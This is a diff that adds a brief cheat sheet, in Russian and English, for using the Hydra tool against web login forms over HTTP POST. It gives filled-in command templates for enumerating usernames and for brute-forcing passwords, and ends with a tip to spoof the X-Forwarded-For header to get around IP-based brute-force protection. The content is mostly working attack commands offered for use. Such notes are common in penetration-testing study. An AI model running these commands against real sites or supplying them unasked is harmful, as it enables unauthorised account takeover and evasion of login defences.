@@ -1,0 +1,29 @@
+Hydra manual
+https://codeby.net/blogs/brutforsing-veb-sajtov-s-hydra-chast-vtoraja-instrukcii-po-hydra
+
+
+HTTP POST
+
+http-post-form://
+https-post-form://
+
+$ hydra -U http-post-form	мануал по модулю http-post-form
+F=<condition>		если встретилось в ответе - fail
+S=<condition>		если встертилось в ответе - success!
+
+username 		название поля из запроса
+password		название поля из запроса
+
+-d 			режим отладки, если все вроде должно работать
+
+user enumeration:
+$ hydra -L <logins.txt> -p fakepassword337 -o hydra1.log -f -v https-post-form://<website.com> -m "</login.php>:<username>=^USER^&<password>=^PASS^:<Invalid username>"
+
+password bruteforce
+$ hydra -l <user> -P passwords.txt -o hydra2.log -v https-post-form://<website.com> -m "</login>:<username>=^USER^&<password>=^PASS^:<Incorrect password>"
+
+
+
+IP based brute-force protection
+добавить в запрос параметр 
+X-Forwarded-For:<ip>
